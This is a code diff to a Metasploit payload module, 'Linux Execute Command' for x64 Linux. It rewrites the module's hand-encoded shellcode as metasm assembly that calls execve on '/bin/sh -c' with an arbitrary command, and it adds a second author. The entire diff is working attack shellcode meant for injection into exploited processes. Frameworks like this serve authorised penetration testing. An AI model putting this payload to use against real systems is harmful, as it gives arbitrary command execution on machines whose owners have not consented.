@@ -5,7 +5,7 @@
 
 module MetasploitModule
 
-  CachedSize = 47
+  CachedSize = 44
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -14,7 +14,8 @@ module MetasploitModule
     super(merge_info(info,
       'Name'          => 'Linux Execute Command',
       'Description'   => 'Execute an arbitrary command',
-      'Author'        => 'ricky',
+      'Author'        => ['ricky',
+                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
       'Arch'          => ARCH_X64))
@@ -26,24 +27,35 @@ module MetasploitModule
   end
 
   def generate_stage(opts={})
-    cmd = (datastore['CMD'] || '') + "\x00"
-    call = "\xe8" + [cmd.length].pack('V')
-    payload =
-      "\x6a\x3b"                     + # pushq  $0x3b
-      "\x58"                         + # pop    %rax
-      "\x99"                         + # cltd
-      "\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
-      "\x73\x68\x00"                 + #
-      "\x53"                         + # push   %rbx
-      "\x48\x89\xe7"                 + # mov    %rsp,%rdi
-      "\x68\x2d\x63\x00\x00"         + # pushq  $0x632d
-      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
-      "\x52"                         + # push   %rdx
-      call                           + # callq  2d <run>
-      cmd                            + # .ascii "cmd\0"
-      "\x56"                         + # push   %rsi
-      "\x57"                         + # push   %rdi
-      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
-      "\x0f\x05"                       # syscall
+    cmd = datastore['CMD'] || ''
+    pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)
+    payload = <<-EOS
+        mov rax, 0x68732f6e69622f
+        cdq
+
+        push rax
+        push rsp
+        pop rdi                 ; "/bin/sh\0"
+
+        push rdx
+        #{pushw_c_opt}
+        push rsp
+        pop rsi                 ; "-c\0"
+
+        push rdx
+        call continue
+        db "#{cmd}", 0x00       ; arbitrary command
+      continue:
+        push rsi
+        push rdi
+        push rsp
+        pop rsi
+
+        push 0x3b
+        pop rax
+
+        syscall
+    EOS
+    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
   end
 end
